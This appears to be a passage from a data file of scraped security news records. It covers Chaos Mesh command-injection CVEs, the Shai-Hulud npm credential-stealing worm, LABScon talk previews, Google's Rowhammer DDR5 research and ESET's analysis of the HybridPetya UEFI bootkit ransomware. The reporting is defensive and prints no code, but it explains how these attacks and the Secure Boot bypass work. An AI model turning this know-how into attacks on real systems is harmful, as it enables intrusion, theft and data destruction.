in Chaos Mesh, an open-source Chaos Engineering platform for Kubernetes designed to simulate, test, and identify potential weak spots in pods, networks, and other components. If exploited,the four vulnerabilities, collectively named Chaotic Deputy, could allow attackers to take over entire clusters.The report warned that attackers need only minimal in-cluster network access to exploit the vulnerabilities, enabling them to run fault injections, shut down pods, disrupt communications, and even steal privileged tokens for further attacks.Source: JFrog SecurityCVE-2025-59358(CVSS 7.5) exposes an unauthenticated GraphQL debugging server that lets attackers kill arbitrary processes in any Kubernetes pod, which could lead to cluster-wide denial-of-service.CVE-2025-59359,CVE-2025-59360,CVE-2025-59361(all, categorized as CVSS 9.8) are command injection flaws in the Chaos Controller Manager’s GraphQL mutations (cleanTcs, killProcesses, and cleanIptables, respectively) that allowremote code execution(RCE).Chaotic Deputy stems from insufficient authentication in the Chaos Controller Manager’s GraphQL server.An in-cluster attacker with initial access to a network could chain the four vulnerabilities to execute arbitrary commands on the Chaos Daemon, achieving full cluster compromise. The result could mean data theft, service disruption, andlateral movementacross Kubernetes environments.The flaws were responsibly disclosed in early May and patched in Chaos Meshversion 2.7.3, released August 21. Users are strongly urged to upgrade immediately, and if patching isn’t possible, mitigations include restricting network traffic to the Chaos Mesh daemon and API server as well as avoiding deployments in open or weakly secured environments.Researchers stressed that while Chaos Engineering platforms offer the ability to test resilience, their deep cluster access and flexibility makes them a high-value target and vulnerabilities like Chaotic Deputy can be especially risky if left unpatched.",

The 'Bad' segment exposes a China-linked threat actor, TA415, which has been engaging in targeted spearphishing campaigns against U.S. government entities and institutions, using trade topics as lures to gain unauthorized access. This highlights the sophisticated tactics some state-sponsored actors employ to infiltrate critical infrastructure. The 'Ugly' segment focuses on vulnerabilities discovered in Chaos Mesh, an open-source platform for Kubernetes, which could potentially allow attackers to take over entire clusters if exploited. These vulnerabilities are particularly concerning as they not only expose data but also pose a significant risk to operational continuity and security across various digital environments.",

      "published_date": "2025-09-16",
      "content": "At least 187 code packages made available through the JavaScript repositoryNPMhave been infected with a self-replicating worm that steals credentials from developers and publishes those secrets onGitHub, experts warn. The malware, which briefly infected multiple code packages from the security vendorCrowdStrike, steals and publishes even more credentials every time an infected package is installed.Image: https://en.wikipedia.org/wiki/Sandworm_(Dune)The novel malware strain is being dubbedShai-Hulud— after the name for the giant sandworms in Frank Herbert’sDunenovel series — because it publishes any stolen credentials in a new public GitHub repository that includes the name “Shai-Hulud.”“When a developer installs a compromised package, the malware will look for a npm token in the environment,” saidCharlie Eriksen, a researcher for the Belgian security firmAikido. “If it finds it, it will modify the 20 most popular packages that the npm token has access to, copying itself into the package, and publishing a new version.”At the center of this developing maelstrom are code libraries available onNPM(short for “Node Package Manager”), which acts as a central hub for JavaScript development and provides the latest updates to widely-used JavaScript components.The Shai-Hulud worm emerged just days after unknown attackerslaunched a broad phishing campaignthat spoofed NPM and asked developers to “update” their multi-factor authentication login options. That attack led to malware being inserted into at least two-dozen NPM code packages, but the outbreak was quickly contained and was narrowly focused on siphoning cryptocurrency payments.Image: aikido.devIn late August, another compromise of an NPM developer resulted in malware being added to “nx,” an open-source code development toolkit with as many as six million weekly downloads. In the nx compromise, the attackers introduced code that scoured the user’s device for authentication tokens from programmer destinations like GitHub and NPM, as well as SSH and API keys. But instead of sending those stolen credentials to a central server controlled by the attackers, the malicious nx code created a new public repository in the victim’s GitHub account, and published the stolen data there for all the world to see and download.Last month’s attack on nx did not self-propagate like a worm, but this Shai-Hulud malware does and bundles reconnaissance tools to assist in its spread. Namely, it uses the open-source toolTruffleHogto search for exposed credentials and access tokens on the developer’s machine. It then attempts to create new GitHub actions and publish any stolen secrets.“Once the first person got compromised, there was no stopping it,” Aikido’s Eriksen told KrebsOnSecurity. He said the first NPM package compromised by this worm appears to have been altered on Sept. 14, around 17:58 UTC.The security-focused code development platformsocket.devreportsthe Shai-Halud attack briefly compromised at least 25 NPM code packages managed by CrowdStrike. Socket.dev said the affected packages were quickly removed by the NPM registry.In a written statement shared with KrebsOnSecurity, CrowdStrike said that after detecting several malicious packages in the public NPM registry, the company swiftly removed them and rotated its keys in public registries.“These packages are not used in the Falcon sensor, the platform is not impacted and customers remain protected,” the statement reads, referring to the company’s widely-used endpoint threat detection service. “We are working with NPM and conducting a thorough investigation.”Awriteup on the attackfromStepSecurityfound that for cloud-specific operations, the malware enumerates AWS, Azure and Google Cloud Platform secrets. It also found the entire attack design assumes the victim is working in a Linux or macOS environment, and that it deliberately skips Windows systems.StepSecurity said Shai-Hulud spreads by using stolen NPM authentication tokens, adding its code to the top 20 packages in the victim’s account.“This creates a cascading effect where an infected package leads to compromised maintainer credentials, which in turn infects all other packages maintained by that user,” StepSecurity’sAshish Kurmiwrote.Eriksen said Shai-Hulud is still propagating, although its spread seems to have waned in recent hours.“I still see package versions popping up once in a while, but no new packages have been compromised in the last ~6 hours,” Eriksen said. “But that could change now as the east coast starts working. I would think of this attack as a ‘living’ thing almost, like a virus. Because it can lay dormant for a while, and if just one person is suddenly infected by accident, they could restart the spread. Especially if there’s a super-spreader attack.”For now, it appears that the web address the attackers were using to exfiltrate collected data was disabled due to rate limits, Eriksen said.Nicholas Weaveris a researcher with theInternational Computer Science Institute, a nonprofit in Berkeley, Calif. Weaver called the Shai-Hulud worm “a supply chain attack that conducts a supply chain attack.” Weaver said NPM (and all other similar package repositories) need to immediately switch to a publication model that requires explicit human consent for every publication request using a phish-proof 2FA method.“Anything less means attacks like this are going to continue and become far more common, but switching to a 2FA method would effectively throttle these attacks before they can spread,” Weaver said. “Allowing purely automated processes to update the published packages is now a proven recipe for disaster.”",
      "summary": "The Shai-Hulud worm is a self-replicating malware strain that has infected at least 187 code packages available through the JavaScript repository NPM, stealing credentials from developers and publishing them on GitHub. The worm targets npm tokens to modify the 20 most popular packages in an attempt to propagate itself further. It also uses tools like TruffleHog for credential scanning before creating new GitHub actions to publish stolen secrets.\n\nThe attack highlights a significant concern about software supply chain security, as compromised packages can lead to widespread data theft and unauthorized access across multiple platforms.

Hosted in Scottsdale, Arizona, from September 17–20, this year’s event features an exceptional lineup of speakers and thought leaders.A full schedule of the event is now availablehere. In this post, we put a spotlight on some of the most hotly-anticipated presentations we’ve got lined up for LABScon 2025.As with previous years,we’ll be releasing videos of some of the most popular talks in the weeks ahead, so bookmark theSentinelLABS home page, follow us on your favorite social media platform (LinkedIn,X,Bluesky), or sign up for the SentinelOne weekly email digest (eyes right →) to find out when the talks that catch your eye are publicly released.Plunging the Internet Toilets: The Illicit Economy Enabling High-Tech Harassment, Stalking and Sextortion in the StratosphereTrevor HilligossAurora JohnsonSpyCloud Labs’Trevor HilligossandAurora Johnsonbring us a deep dive into ‘internet toilets’: toxic online communities where netizens can dox their enemies and exes and collaborate with others to conduct aggressive cyberbullying and harassment campaigns. Focusing on Chinese online cesspools, Hilligoss and Johnson show how these Chinese internet toilets have strong similarities to western doxing communities and sadistic harm groups. More broadly, the presenters argue that digital gender-based-violence acts as a core motivator and monetary driver of cybercrime across the globe.Internet toilet users often purchase data and technical services to enable targeted harassment and stalking. The speakers go over some of the tools and services marketed to doxers, stalkers, and harassers on Chinese darknet marketplaces across three main categories: personal data lookup services, which are often serviced by corrupt insiders with positions in public security and technology companies, digital harassment tools such as SMS bombardment services, and sexploitation tools like AI nudify apps.Because some of this activity occurs on monetizable social media platforms, harassers and internet toilet admins can also get paid simply for making popular posts that get a lot of engagement. In many cases, this doxing and harassment escalates to physical violence and has even driven victims to suicide.Honeypots and Hostile Takeovers: A Field Guide to Organizational ArbitrageKristin Del RossoNot all compromises happen at the endpoint. While technical compromise is well understood, behavioral compromise enabled by social engineering, organizational dysfunction, and misaligned incentives remains a threat vector ripe for exploitation.Kristin Del Rosso(DEVSEC) walks through a methodological means of recognizing patterns that lead to cultivated insider threats, where actors exploit gaps in organizational visibility, policy exceptions, or social dynamics to gain influence, access, or placement.Through anonymized case studies involving honeypotted executives, attempted hostile internal takeovers, and corporate espionage efforts, this talk dissects how subtle signals such as behavioral changes, relationship mapping, and broken enforcement norms can reveal growing security debt inside an organization. It will also show how technical instrumentation often misses this layer entirely unless designed with these dynamics in mind.Kristin offers a practical framework for identifying organizational arbitrage, enforcing security culture, and separating malicious insiders from “move fast” employees, before a network compromise ever occurs.How to Bug Hotel RoomsDan TentlerDo you travel with expensive stuff? Do you like feeling safe about leaving your expensive stuff in your hotel room? Have you ever had anything stolen out of your room, or discovered someone has gained access to your room while you weren’t there? What about…other rooms? Maybe not EXACTLY a hotel room? Phobos Group’sDan Tentlerhas presented on securing hotel rooms in the past, but now with Home Assistant, Z-Wave devices, Co2 sensors and mmWave radar, it’s become a whole new game.In this talk, Dan shares his full travel security system. Using Home Assistant to automate things makes it incredibly easy to create rules to send alerts, turn lights on or off, make sounds, take pictures or anything else Home Assistant is capable of, but who knew it could be deployed tactically? Millimeter wave radar units can see through walls, which makes for a uniquely interesting development: like, who is lurking outside your room, or even in the room next door.Dan’s presentation covers the basics of how all this equipment works, including a brief introduction to Home Assistant, deployment methodologies, how it can be used and future considerations – up to and including manufacturing and selling kits for deployment.Your Apes May Be Gone, But the Hackers Made $9 Billion and They’re Still HereAndrew MacPhersonLast year, crypto thefts hit $9.32 billion—more than half of all cybercrime losses. North Korea just pulled off a $1.5 billion heist from a single exchange. Meanwhile, most security professionals still think crypto is just magic internet money for buying NFT monkeys.Andrew Macpherson’s talk is for the crypto-skeptical security professional who’s tired of hearing about “blockchain” and shows why crypto security is 90% the same Web2 skills you already have—phishing, social engineering, API abuse—just with irreversible consequences and way better attacker ROI.Beginning with a practical crypto primer covering the essentials, the talks explains how blockchains work, what wallets actually do, and why stablecoins matter. Then, Andrew dives into the current threat landscape: who’s stealing what, how OFAC sanctions work in a pseudonymous world, and why traditional threat intel is failing miserably at tracking crypto crime.Most importantly, the presentation shows what makes crypto security uniquely interesting: immutable code, irreversible transactions, and attackers’ monetary wins that can’t just be rolled or clawed back. Threat actors range from nation-states to teenage hackers, the attack surface spans everything from smart contract logic to social engineering, and the defensive tooling is still being invented.Come for the massive heist stories, stay because you realize this is an unexplored frontier with its own unique problems. By the end, you’ll understand why crypto security attracts both sophisticated attackers and curious defenders—not for the hype, but because it’s a different kind of security challenge worth understanding.LLM Malware In the WildGabriel Bernadett-ShapiroAlex DelamotteLarge language models (LLMs) are now part of mainstream software‑development workflows, but they have also become a powerful new tool for adversaries. Over the past year, the presenters wrote a multi‑provider YARA rule that hunts for hard‑coded OpenAI and Anthropic model credentials inside files uploaded to VirusTotal. The rule triggered on fully‑weaponised binaries and scripts that outsource key stages of the attack chain to commercial AI services.In this talk, SentinelLABS’Gabriel Bernadett-ShapiroandAlex Delamotteunpack what they found. The presentation walks through multiple malware families that embed real API keys and offload tasks such as phishing‑email generation, victim triage, code‑signing bypasses and on‑device payload generation to commercial LLMs.Gabriel and Alex explore how LLM‑powered malware changes the defender’s problem space: static signatures fail because the malicious logic is produced only at run‑time; network inspection is harder because calls look identical to legitimate use; and prompt engineering itself becomes an adversarial discipline.The Elephant in Many Rooms: Orange Indra’s Consistent Hunt for Access in the Asia Pacific RegionJono DavisWithin the ecosystem of espionage-oriented threat actors, there is often an unspoken hierarchy of intrusion sets; China-based, Russia-based, Iran-based, and North Korea-based threat actors are often regarded as being both tactically and strategically more relevant to Western organisations versus others.In this talk, PwC’sJono Davisshines a light on one of the less-discussed threat actors, introducing an intrusion set PwC assesses to be based in South Asia and have observed since at least 2024 conducting substantial credential phishing activity across the Asia Pacific region and beyond.This is a threat actor PwC has dubbed Orange Indra (currently not aligned to any open-source nomenclature), responsible for campaigns targeting defence and government entities of countries that align with foreign policy objectives of the country it is based in.In using Orange Indra as an example, Jono highlights the tools, techniques, and procedures (TTPs) of a prolific, efficient threat actor, alongside a strategic overview of the South Asia more broadly as it pertains to the wider Asia Pacific, and the potential near-future conflicts for regional hegemony.Finally, this talk provides a platform to emphasise the strategic imperative for organisations, analysts, and the wider intelligence community to pay attention to threat actors emanating beyond the “Big 4” outlined above.Are Your Chinese Cameras Spying For You or on You?Silas CutlerMarc RogersHundreds of thousands, if not millions, of Chinese cameras, alarms and security systems have backdoors, and are designed to be ready to spy on you out of the box. Destined for the dumpster, most of these devices are designed to be unmaintainable.Delivered by a sophisticated shadow supply chain that bypasses regulatory scrutiny supplying fake FCC, CE and UL certification, these devices are carefully laundered through online shopping platforms like Amazon and even high street shops.In this talk,Silas Cutler(Censys) andMarc Rogers(nbhd.ai) present their analysis of the devices and current understanding of present backdoors. Additionally, this talk will cover past and ongoing efforts to hold transgressors accountable.Auto-Poking The Bear – Analytical Tradecraft In The AI AgeMartin WendiggensenBrad PalmAnalytical tradecraft and shared standards have transformed Cyber Threat Intelligence from a niche discipline into a collaborative industry-wide research endeavor. Researchers and analysts now routinely build on each other’s work, creating a foundation of trust and shared methodology.AI is disrupting this ecosystem, as we increasingly delegate data preparation, analysis, and entire workflows to AI assistants. Doing so will make us more productive, but not without cost. While you may trust your own AI-assisted analysis, can you trust another researcher’s prompts/agent process? As questions about reliability and transparency persist, we will need to adapt our research methodology and develop a new joint understanding of the promises, pitfalls, and probabilities inherent in AI-assisted work.Dreadnode’sMartin WendiggensenandBrad Palmtackle these challenges through a concrete case study, presenting their own LLM-based agentic system, developed to analyze Russian internet data leaked by Ukrainian cyber activists. The speakers walk through the system’s architecture and demonstrate its performance across tasks ranging from simple data collation to sophisticated analytical workflows to track adversaries.Along the way, they outline how to understand the promises and limitations of this technology and more importantly, how to communicate them transparently to other researchers and audiences in order to maintain transparency and accountability for published products.Hacktivism and War: Malicious Activism and Nation-State Fronts in Times of Conflict – A Clarifying DiscussionJim WalterSentinelLABS’ ownJim Walterexplores how malicious hacktivist activity is being strategically leveraged by nation-states and mercenary groups to obscure intent, destabilize targets, and weaponize public narratives. Through technical case studies and geopolitical analysis, Jim’s talk examines how these actors blend ransomware, data leaks, DDoS, and psychological operations under activist façades—creating significant challenges for attribution, response, and long-term threat modeling.Combined with a review of existing and still highly-prolific traditional hacktivist groups and their role in the current landscape, this presentation offers to bring some much needed clarity to a very murky and confusing landscape.Simulation Meets Reality: How China’s Cyber Ranges Fuel Cyber OperationsMei DanowskiEugenio BenincasaBetween late 2024 and early 2025, the United States government issued indictments or sanctions against three Chinese information security firms – i-SOON, Sichuan Silence, and Integrity Tech – alleging their support for or links to malicious cyber groups targeting US government and critical infrastructure systems.In their research,Mei Danowski(Natto Thoughts) andEugenio Benincasa(ETH Zurich) found that all three companies serve as a key seedbed for nurturing China’s offensive cyber talent with cyber range services, which train cybersecurity professionals through “attack-defense live-fire” (攻防实战) exercises. Alongside hacking contests and crowdsourced bug bounty programs, attack-defense live-fire exercises are one of the primary mechanisms leveraged by the Chinese government to enhance its cyber capabilities, with support from a rapidly growing private cybersecurity industry with more than 4000 products and services providers.This presentation focuses on the development of attack-defense exercises and commercial cyber ranges in China, areas that have received relatively little attention to date.The talk examines how this ecosystem is shaping China’s offensive cyber capabilities and discusses 120 companies identified as providers of attack-defense exercises and cyber range services.CamoFei Meets the TalibanAleksandar MilenkoskiJulian-Ferdinand VögeleSentinelLABS’Aleksandar Milenkoskiand Insikt Group’sJulian-Ferdinand Vögeleteam uponce againto bring you a unique talk on CamoFei, a threat actor that overlaps with ChamelGang (aka TAG-112, Evasive Panda), and which sets itself apart within the landscape of China-linked APT groups through a dual-track operational model that blends traditional cyber espionage with disruptive activities.The group continues to target high-profile entities of strategic interest to Chinese intelligence, including Tibetan and Taiwanese organizations, while simultaneously engaging in operations that suggest influence or destabilization objectives, often layered with plausible deniability.As of early 2025, CamoFei remains highly active, expanding its reach across a diverse set of governmental and private-sector targets in Southeast Asia, Europe, and the Middle East while adopting new tactics and techniques. Its recent compromise of Taliban networks in Afghanistan, which coincided with a suspected hack-and-leak influence campaign targeting the Taliban itself, points to a possible evolution toward hybrid operations that merge technical intrusions with geopolitical narratives.While the shift remains unconfirmed, it reflects the broader challenge posed by the increasingly blurred lines between espionage, influence operations, and cybercrime, making attribution and intent analysis more difficult.As multiple CamoFei victims exhibit signs of concurrent compromise by other Chinese-nexus groups, the case underscores a broader analytic challenge, namely, that overlapping intrusions within the same victim environments complicate attribution and intent analysis, raising important questions about coordination, operational autonomy, and competition within the broader Chinese threat ecosystem.SentinelLABSWe are hunters, reversers, exploit developers, and tinkerers shedding light on the world of malware, exploits, APTs, and cybercrime across all platforms.Learn More",

      "url": "http://security.googleblog.com/2025/09/supporting-rowhammer-research-to.html",
      "published_date": "2025-09-15",
      "content": "Posted by Daniel MoghimiRowhammer is a complex class of vulnerabilities across the industry. It is a hardware vulnerability in DRAM where repeatedly accessing a row of memory can cause bit flips in adjacent rows, leading to data corruption. This can be exploited by attackers to gain unauthorized access to data, escalate privileges, or cause denial of service. Hardware vendors have deployed various mitigations, such asECCand Target Row Refresh (TRR) for DDR5 memory, to mitigate Rowhammer and enhance DRAM reliability. However, the resilience of those mitigations against sophisticated attackers remains an open question.To address this gap and help the ecosystem with deploying robust defenses, Google has supported academic research and developed test platforms to analyze DDR5 memory. Our effort has led to the discovery of new attacks and a deeper understanding of Rowhammer on the current DRAM modules, helping to forge the way for further, stronger mitigations.What is Rowhammer?Rowhammerexploits a vulnerability in DRAM. DRAM cells store data as electrical charges, but these electric charges leak over time, causing data corruption. To prevent data loss, the memory controller periodically refreshes the cells. However, if a cell discharges before the refresh cycle, its stored bit may corrupt. Initially considered a reliability issue, it has been leveraged by security researchers to demonstrate privilege escalation attacks. By repeatedly accessing a memory row, an attacker can cause bit flips in neighboring rows. An adversary can exploit Rowhammer via:Reliably cause bit flipsby repeatedly accessing adjacent DRAM rows.Coerce other applicationsor the OS into using these vulnerable memory pages.Target security-sensitive code or datato achieve privilege escalation.Or simply corrupt system’s memory tocause denial of service.Previous work has repeatedly demonstrated the possibility of such attacks from software [Revisiting rowhammer,Are we susceptible to rowhammer?,Drammer,Flip feng shui,Jolt]. As a result, defending against Rowhammer is required for secure isolation in multi-tenant environments like the cloud.Rowhammer MitigationsThe primary approach to mitigate Rowhammer is to detect which memory rows are being aggressively accessed and refreshing nearby rows before a bit flip occurs. TRR is a common example, which uses a number of counters to track accesses to a small number of rows adjacent to a potential victim row. If the access count for these aggressor rows reaches a certain threshold, the system issues a refresh to the victim row. TRR can be incorporated within the DRAM or in the host CPU.However, this mitigation is not foolproof. For example, theTRRespassattack showed that by simultaneously hammering multiple, non-adjacent rows, TRR can be bypassed. Over the past couple of years, more sophisticated attacks [Half-Double,Blacksmith] have emerged, introducing more efficient attack patterns.In response, one of our efforts was to collaborate withJEDEC, external researchers, and experts to define thePRACas a new mitigation that deterministically detects Rowhammer by tracking all memory rows.However, current systems equipped with DDR5 lack support for PRAC or other robust mitigations. As a result, they rely on probabilistic approaches such as ECC and enhanced TRRto reduce the risk. While these measures have mitigated older attacks, their overall effectiveness against new techniques was not fully understood until our recentfindings.Challenges with Rowhammer AssessmentMitigating Rowhammer attacks involves making it difficult for an attacker to reliably cause bit flips from software. Therefore, for an effective mitigation, we have to understand how a determined adversary introduces memory accesses that bypass existing mitigations. Three key information components can help with such an analysis:How the improved TRR and in-DRAM ECC work.How memory access patterns from software translate into low-level DDR commands.(Optionally) How any mitigations (e.g., ECC or TRR) in the host processor work.The first step is particularly challenging and involves reverse-engineering the proprietary in-DRAM TRR mechanism, which varies significantly between different manufacturers and device models. This process requires the ability to issue precise DDR commands to DRAM and analyze its responses, which is difficult on an off-the-shelf system. Therefore, specialized test platforms are essential.The second and third steps involve analyzing the DDR traffic between the host processor and the DRAM. This can be done using an off-the-shelf interposer, a tool that sits between the processor and DRAM. A crucial part of this analysis is understanding how a live system translates software-level memory accesses into the DDR protocol.The third step, which involves analyzing host-side mitigations, is sometimes optional. For example, host-side ECC (Error Correcting Code) is enabled by default on servers, while host-side TRR has only been implemented in some CPUs.Rowhammer testing platformsFor the first challenge, we partnered with Antmicro to develop two specialized, open-source FPGA-based Rowhammer test platforms.

Our findings, detailed in the recently co-authored \"Phoenix” research paper, reveal that we successfully developed custom attack patterns capable of bypassing enhanced TRR (Target Row Refresh) defense on DDR5 memory. We were able to create a novel self-correcting refresh synchronization attack technique, which allowed us to perform the first-ever Rowhammer privilege escalation exploit on a standard, production-grade desktop system equipped with DDR5 memory. While this experiment was conducted on an off-the-shelf workstation equipped with recent AMD Zen processors and SK Hynix DDR5 memory, we continue to investigate the applicability of our findings to other hardware configurations.Lessons learnedWe showed that current mitigations for Rowhammer attacks are not sufficient, and the issue remains a widespread problem across the industry. They do make it more difficult “but not impossible” to carry out attacks, since an attacker needs an in-depth understanding of the specific memory subsystem architecture they wish to target.Current mitigations based on TRR and ECC rely on probabilistic countermeasures that have insufficient entropy. Once an analyst understands how TRR operates, they can craft specific memory access patterns to bypass it. Furthermore, current ECC schemes were not designed as a security measure and are therefore incapable of reliably detecting errors.Memory encryption is an alternative countermeasure for Rowhammer. However, our current assessment is that without cryptographic integrity, it offers no valuable defense against Rowhammer. More research is needed to develop viable, practical encryption and integrity solutions.Path forwardGoogle has been a leader in JEDEC standardization efforts, for instance withPRAC, a fully approved standard to be supported in upcoming versions ofDDR5/LPDDR6. It works by accurately counting the number of times a DRAM wordline is activated and alerts the system if an excessive number of activations is detected. This close coordination between the DRAM and the system gives PRAC a reliable way to address Rowhammer.In the meantime, we continue to evaluate and improve other countermeasures to ensure our workloads are resilient against Rowhammer. We collaborate with our academic and industry partners to improve analysis techniques and test platforms, and to share our findings with the broader ecosystem.Want to learn more?“Phoenix: Rowhammer Attacks on DDR5 with Self-Correcting Synchronization” will be presented atIEEE Security & Privacy 2026in San Francisco, CA (MAY 18-21, 2026).",

      "content": "ESET Research has discovered HybridPetya, on the VirusTotal sample sharing platform. It is a copycat of the infamous Petya/NotPetya malware, adding the capability of compromising UEFI-based systems and weaponizing\nCVE‑2024‑7344\nto bypass UEFI Secure Boot on outdated systems.\nKey points of this blogpost:\nNew ransomware samples, which we named HybridPetya, resembling the infamous Petya/NotPetya malware, were uploaded to VirusTotal in February 2025.\nHybridPetya encrypts the Master File Table, which contains important metadata about all the files on NTFS-formatted partitions.\nUnlike the original Petya/NotPetya, HybridPetya can compromise modern UEFI-based systems by installing a malicious EFI application onto the EFI System Partition.\nOne of the analyzed HybridPetya variants exploits CVE‑2024‑7344 to bypass UEFI Secure Boot on outdated systems, leveraging a specially crafted\ncloak.dat\nfile.\nESET telemetry shows no signs of HybridPetya being used in the wild yet; this malware does not exhibit the aggressive network propagation seen in the original NotPetya.\nOverview\nLate in July 2025, we encountered suspicious ransomware samples, uploaded to VirusTotal from Poland, under various filenames, including\nnotpetyanew.exe\nand other similar ones, suggesting a connection with the infamously destructive malware that\nstruck Ukraine and many other countries back in 2017\n. The NotPetya attack is believed to be the most destructive cyberattack in history,\nwith more than $10 billion in total damages\n. Despite NotPetya’s similarity to the Petya ransomware, first\ndiscovered in March 2016\n, NotPetya’s purpose was pure destruction, as encryption key recovery from the victim’s personal installation key was not possible. Because of the shared characteristics of the currently discovered samples with both Petya and NotPetya, we named the new discovery HybridPetya.\nWhile ESET telemetry shows no active use of HybridPetya in the wild, one important detail in these samples still caught our attention – unlike the original NotPetya (and Petya ransomware as well), HybridPetya is also capable of compromising modern UEFI-based systems by installing a malicious EFI application to the EFI System Partition. The deployed UEFI application is then responsible for encryption of the\nNTFS\n-related\nMaster File Table\n(MFT) file – an important metadata file containing information about all the files on the NTFS-formatted partition.\nAfter a bit more digging, we discovered something even more interesting on VirusTotal:\nan archive\ncontaining the whole EFI System Partition contents, including a very similar HybridPetya UEFI application, but this time bundled in a specially formatted\ncloak.dat\nfile, vulnerable to CVE‑2024‑7344 – the\nUEFI Secure Boot bypass vulnerability\n– that our team disclosed in early 2025.\nInterestingly, despite the filenames on VirusTotal and the format of the ransom note in the current samples suggesting that they might be related to NotPetya, the algorithm used for the generation of the victim’s personal installation key, unlike in the original NotPetya, allows the malware operator to reconstruct the decryption key from the victim’s personal installation keys. Thus, HybridPetya can serve as regular ransomware (more like Petya), rather than being solely destructive like NotPetya.\nInterestingly, on September 9\nth\n, 2025,\n@hasherezade\npublished a\npost\nabout the existence of a UEFI Petya PoC, with a video demonstrating execution of the malware with UEFI Secure Boot enabled. Even though the sample from the video is obviously different from the one presented in this blogpost (showing the typical Petya ASCII art skull, which is not present in the samples we discovered), we suspect that there might be some relationship between the two cases, and that HybridPetya might also be just a proof of concept developed by a security researcher or an unknown threat actor.\nIn this blogpost, we focus on the technical analysis of HybridPetya.\nHybridPetya technical analysis\nIn this section, we provide a technical analysis of HybridPetya’s components: the bootkit and its installer. We also separately dissect a version of HybridPetya that is capable of bypassing UEFI Secure Boot by exploiting CVE-2024-7344. Note that HybridPetya supports both legacy and UEFI based systems – in this blogpost, we’ll focus on the UEFI part.\nInterestingly, the code responsible for generating the victims’ personal installation keys seems to be inspired by the\nRedPetyaOpenSSL\nPoC. We are aware of at least one other UEFI-compatible PoC rewrite of NotPetya, dubbed\nNotPetyaAgain\n, which is written in\nRust\n; however, that code is unrelated to HybridPetya.\nUEFI bootkit\nWe obtained two distinct versions of the UEFI bootkit component, both very similar but with certain differences. When executed, the bootkit first loads its configuration from the\n\\EFI\\Microsoft\\Boot\\config\nfile, and checks the encryption flag indicating the current encryption status – same as the original Petya/NotPetya samples, the encryption flag can have one of the following values:\n0 -\nready for encryption,\n1 -\nalready encrypted, or\n2 -\nransom paid, disk decrypted.\nIt continues with execution based on the encryption status flag, as shown in Figure 1.\nFigure 1. Overview of HybridPetya’s execution logic\nDisk encryption\nIf the value of the encryption flag is\n0\n, the bootkit extracts the 32-byte-long\nSalsa20\nencryption key and 8-byte-long nonce from the configuration data, and subsequently rewrites the configuration file, now with the encryption key zeroed and the encryption flag set to\n1\n. It continues with encryption of the\n\\EFI\\Microsoft\\Boot\\verify\nfile with the Salsa20 encryption algorithm using the key and nonce from the configuration. Then, before proceeding to its main functionality – disk encryption – it creates the file\n\\EFI\\Microsoft\\Boot\\counter\non the EFI System Partition; the purpose of this file is explained later.\nThe disk encryption process starts with identification of all NTFS-formatted partitions. As shown in Figure 2, the sample does so by getting the list of handles for connected storage devices, identifying the individual partitions by checking that\nEFI_BLOCK_IO_MEDIA->LogicalPartition\nis\nTRUE\n, and finally verifying whether the partition is NTFS formatted by comparing the first four bytes of the data present in the first partition’s sector with the NTFS signature\nNTFS\n.\nFigure 2. Hex-Rays decompiled code for NTFS partition identification\nOnce the NTFS partitions have been identified, the bootkit continues with encryption of the\nMaster File Table\n(MFT) file, the essential metadata file containing information about other files and the location of their data on the NTFS-formatted partition. As shown in Figure 3, during the encryption, the bootkit rewrites the contents of the\n\\EFI\\Microsoft\\Boot\\counter\nfile with the number of already encrypted disk clusters, and updates the fake CHKDSK message displayed on the victim’s screen (shown in Figure 4), with the information about the current encryption status (though, based on the message, the victim may believe that the disk is being checked for errors, not being encrypted).\nFigure 3. Hex-Rays decompiled code: MFT encryption\nFigure 4. Fake CHKDSK message shown by HybridPetya during disk encryption (identical with NotPetya and Petya)\nWhen done with the encryption, the bootkit reboots the machine.\nDisk decryption\nIf the bootkit detects that the disk is already encrypted, meaning that the value of the encryption flag from the configuration file is\n1\n, it shows the ransom note shown in Figure 5 or Figure 6 (depending on the bootkit version), and asks the victim to enter the decryption key. Note that while the HybridPetya ransom note has the same format as that of the original NotPetya (shown in Figure 7), the ransom amount, bitcoin address, and the operator’s email address are different. Also, the version deployed with the UEFI Secure Boot bypass uses a different contact email address (\nwowsmith999999@proton[.]me\n) than the version deployed by the obtained installers (\nwowsmith1234567@proton[.]me\n). It’s worth mentioning that the bitcoin address is the same in both versions.\nFigure 5. Ransom note from the bootkit installed by the installers without the UEFI Secure Boot bypass\nFigure 6. Ransom note displayed by the bootkit version deployed by exploiting CVE-2024-7344\nFigure 7. Original NotPetya ransom note\nWhen a key with the correct length – 32 characters – is entered and confirmed by the victim pressing Enter, the bootkit proceeds to verification of the key. As depicted in Figure 8, key validity is established by attempting to decrypt the aforementioned\n\\EFI\\Microsoft\\Boot\\verify\nfile with the supplied key, and checking whether the plaintext contains only bytes with value\n0x07\n. Note that the bootkit variant deployed via the UEFI Secure Boot bypass hashes the supplied key with an algorithm probably based on\nSPONGENT-256/256/16\n, using that hash value as the decryption key, while the bootkit deployed by the obtained installers takes the user’s input as is.\nFigure 8. Hex-Rays decompiled code: disk-decryption key validity verification\nIf the correct key is entered, the bootkit updates the configuration file with the encryption flag value set to 2 and also fills in the decryption key. Then it reads the contents of the\n\\EFI\\Microsoft\\Boot\\counter\nfile (containing the number of disk clusters previously encrypted) and proceeds with disk decryption. For the decryption, the bootkit proceeds with a very similar process to that of NTFS partition discovery and MFT decryption (the Salsa20 encryption and decryption process is the same) as described in the\nDisk encryption\nsection. The decryption stops when the number of decrypted clusters is equal to the value from the\ncounter\nfile. During the process of MFT decryption, the bootkit shows the current decryption process status, depicted in Figure 9, on the victim’s screen.\nFigure 9. Decryption status shown to a victim after entering a valid key\nNext, the bootkit proceeds with recovering the legitimate bootloaders\n\\EFI\\Microsoft\\Boot\\bootmgfw.efi\nand\n\\EFI\\Boot\\bootx64.efi\nfrom the backup file previously created during the installation process:\n\\EFI\\Microsoft\\Boot\\bootmgfw.efi.old\n.\nFinally, after the decryption process is finished and the legitimate bootloaders recovered, the bootkit prompts the victim to reboot the device (Figure 10). If everything went well, the device should start the operating system successfully after the reboot.\nFigure 10. Prompt to reboot victim device after successful disk decryption\nDeploying the UEFI bootkit component\nIn this section, we focus on the bootkit-installation functionality of the discovered HybridPetya installers. Note that the installers we were able to obtain do not take UEFI Secure Boot into account. However, as explained in the\nCVE-2024-7344 exploitation\nsection, there is likely a variant with such an improvement.\nTo decide whether the system is UEFI based, the installer retrieves the disk information (\nIOCTL_DISK_GET_DRIVE_LAYOUT_EX\n), checks whether the GPT partitioning scheme is used 